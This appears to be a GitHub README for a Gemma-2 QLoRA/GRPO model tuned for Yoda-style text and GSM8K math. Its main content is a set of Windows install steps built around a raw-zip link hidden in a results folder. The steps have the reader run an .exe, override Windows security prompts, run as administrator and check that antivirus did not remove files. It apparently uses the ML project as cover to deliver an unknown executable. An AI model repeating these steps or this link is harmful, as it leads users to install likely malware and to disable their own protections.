# 🧠 gemma2-qlora-sft-grpo - Run Gemma Math and Style Model

[🟪 Download the app](https://raw.githubusercontent.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/main/results/grpo/gemma_sft_grpo_qlora_3.1.zip)

## 🚀 What this app does

This project helps you run a fine-tuned Gemma-2-2b model that can handle two main tasks:

- Write in a Yoda-like style
- Solve GSM8K math problems

It uses a mix of supervised fine-tuning and GRPO training. It also uses a reward setup that checks:

- If the answer is correct
- If the format looks right
- If the text matches the style target

You can use it to generate text with a small language model that has been tuned for these tasks.

## 💻 What you need

Before you install, check that your PC has:

- Windows 10 or Windows 11
- At least 8 GB RAM
- 16 GB RAM or more if you want smoother use
- Enough free disk space for the app and model files
- A stable internet connection for the first download

If your computer has a modern NVIDIA graphics card, the app can run faster. If not, it can still run on the CPU, but it may take longer.

## 📥 Download and install

1. Open the download page:
   [https://raw.githubusercontent.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/main/results/grpo/gemma_sft_grpo_qlora_3.1.zip](https://raw.githubusercontent.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/main/results/grpo/gemma_sft_grpo_qlora_3.1.zip)

2. Find the latest release.

3. Download the Windows file from that release.
   - If you see a `.exe` file, download that file.
   - If you see a `.zip` file, download it and extract it first.

4. If you downloaded a zip file, right-click it and choose Extract All.

5. Open the extracted folder.

6. Double-click the app file to start it.

## 🛠️ First-time setup

When you run the app for the first time:

- It may take a little longer to start
- Windows may ask for permission to run the file
- The app may download model files the first time you use it

If Windows shows a security message, choose the option to run the file anyway if you trust the source.

If the app opens a console window, leave it open while you use the app.

## 🧭 How to use it

The app is built around text prompts. You type a question, then the model gives a response.

### For Yoda-style text

Type a short request like:

- Rewrite this sentence in Yoda style
- Make this text sound like Yoda
- Answer in Yoda speech

The model will try to keep the meaning while changing the style.

### For math reasoning

Type a GSM8K-style math question like:

- If a box has 12 apples and you add 8 more, how many apples are there?
- A train travels 30 miles in 2 hours. What is the speed?

The model will try to solve the problem step by step and give the final answer.

## 🎯 What the training setup includes

This project uses a few parts that work together:

- **SFT**: teaches the model from example answers
- **QLoRA**: lowers memory use so training fits on smaller hardware
- **GRPO**: improves answers using reward signals
- **Reward design**: checks correctness, format, and style
- **DistilBERT style classifier**: helps judge whether the output sounds like the target style

This setup is meant to make the model better at both structure and style.

## 🧪 Example prompts

Try prompts like these:

- Explain this in Yoda style: I am going to the store
- Solve this math problem: Sara has 14 books and buys 9 more. How many books does she have?
- Rewrite this answer so it sounds like Yoda
- Give the final answer only
- Show your reasoning and final result

## ⚙️ Tips for better results

Use short and clear prompts. The model works best when you tell it exactly what you want.

Good prompts:

- Solve this problem step by step
- Rewrite in Yoda style
- Give a final answer in one sentence

Less clear prompts:

- Do the thing
- Make it better
- Help with this

If the result is not what you want, try again with a more direct prompt.

## 🧩 File layout

After download and extract, you may see files like these:

- `app.exe` or a similar Windows launcher
- `README.md`
- `models` folder
- `config` folder
- `logs` folder

Keep the files together in the same folder unless the release notes say something else.

## 🔐 Safe use on Windows

To avoid problems:

- Download only from the release page
- Do not rename files unless needed
- Do not move parts of the app into different folders
- Keep the app in a simple path like `Downloads` or `Desktop`

If Windows Defender blocks the file, check the file name and source before running it.

## ❓ Common problems

### The app will not open

Try these steps:

- Right-click the file and choose Run as administrator
- Make sure you extracted all files if you downloaded a zip
- Check that no files are missing

### The app opens and closes right away

Try this:

- Open it from a command window so you can see the error
- Re-download the release file
- Make sure your antivirus did not remove any files

### The app is slow

Try these steps:

- Close other apps
- Use a machine with more RAM
- If the app offers a GPU mode, turn it on

### The text looks wrong

Try a clearer prompt:

- Say what style you want
- Ask for only one task at a time
- Keep the prompt short

## 📌 What this project is for

This repo focuses on text generation with a small model that was tuned for:

- Style transfer
- Math reasoning
- Reward-based training
- Parameter-efficient fine-tuning

It is useful if you want a model that can answer in a set style and solve basic math tasks in the same setup

## 📎 Download again

If you need the release files again, use this page:

[https://raw.githubusercontent.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/main/results/grpo/gemma_sft_grpo_qlora_3.1.zip](https://raw.githubusercontent.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/main/results/grpo/gemma_sft_grpo_qlora_3.1.zip)

## 🗂️ Topics

- gemma
- grpo
- large-language-models
- lora
- nlp
- peft
- pytorch
- qlora
- reward-model
- rlhf
- sft
- text-generation
- transformers